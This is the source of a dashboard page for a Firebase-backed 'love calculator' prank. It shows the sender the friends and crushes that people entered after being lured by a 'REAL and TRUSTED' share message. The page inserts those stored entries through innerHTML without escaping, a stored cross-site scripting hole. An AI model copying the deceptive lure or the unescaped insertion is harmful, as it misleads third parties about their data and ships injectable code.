<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard</title>
<link rel="stylesheet" href="style.css">
</head>

<body class="bg">

<div class="dashboard-center">

  <h2 class="welcome">Welcome ğŸ‘‹</h2>

  <!-- SHARE SECTION -->
  <div class="card share-card">
    <p><b>ğŸ”— Your Share Link</b></p>

    <div class="copy-row">
      <input id="shareLink" readonly>
      <button class="copy-btn" onclick="copyText('shareLink')">Copy</button>
    </div>

    <button class="wa-btn" onclick="shareWhatsApp()">Share on WhatsApp status</button>
  </div>

  <!-- RESULT TABLE -->
  <div class="card">
    <h3>ğŸ’Œ Received Entries</h3>

    <table id="table">
      <tr>
        <th>Friend</th>
        <th>Crush</th>
        <th>Time</th>
      </tr>
      <tr>
        <td colspan="3" class="empty">No entries yet ğŸ˜…</td>
      </tr>
    </table>
  </div>
  

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB1sYh3UGcubBmxmq70aMAURpolLBGM2_M",
  authDomain: "love-calculator-12.firebaseapp.com",
  projectId: "love-calculator-12",
  storageBucket: "love-calculator-12.firebasestorage.app",
  messagingSenderId: "707941034632",
  appId: "1:707941034632:web:7b6b5a7149b73f7e80cd3d",
  measurementId: "G-CW6SHK3C2T"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const sid = new URLSearchParams(location.search).get("sid");

function copyText(id) {
  const el = document.getElementById(id);
  el.select();
  navigator.clipboard.writeText(el.value);
  alert("Copied âœ…");
}

window.shareWhatsApp = function () {
  const link = document.getElementById("shareLink").value;
  const msg = `Calculate your â¤ï¸ *LOVE Percentage* â¤ï¸ using this *REAL and TRUSTED LOVE CALCULATOR* 
ğŸ˜ğŸ‘¨â€â¤ï¸â€ğŸ‘¨ğŸ‘‡ğŸ‘‡ğŸ‘‡ğŸ‘¨â€â¤ï¸â€ğŸ‘¨ğŸ˜\n${link}`;
  window.open("https://wa.me/?text=" + encodeURIComponent(msg));
};

// ğŸ” Load sender
const senderSnap = await getDocs(
  query(collection(db,"senders"), where("dashboardId","==",sid))
);

if (senderSnap.empty) {
  document.getElementById("table").innerHTML =
    "<tr><td colspan='3'>Invalid dashboard âŒ</td></tr>";
  throw new Error("Invalid SID");
}

const data = senderSnap.docs[0].data();
document.querySelector(".welcome").innerText =
  "Welcome, " + data.senderName + " ğŸ‘‹";

// Set share link
document.getElementById("shareLink").value =
  location.origin + "/prank.html?rid=" + data.receiverId;

// Load entries
const entriesSnap = await getDocs(
  query(collection(db,"entries"), where("receiverId","==",data.receiverId))
);

if (!entriesSnap.empty) {
  document.querySelector(".empty")?.remove();
}

entriesSnap.forEach(d=>{
  const tr = document.createElement("tr");
  tr.innerHTML = `
    <td>${d.data().friend}</td>
    <td>${d.data().crush}</td>
    <td>${new Date(d.data().time).toLocaleString()}</td>
  `;
  document.getElementById("table").appendChild(tr);
});
</script>

</body>
</html>
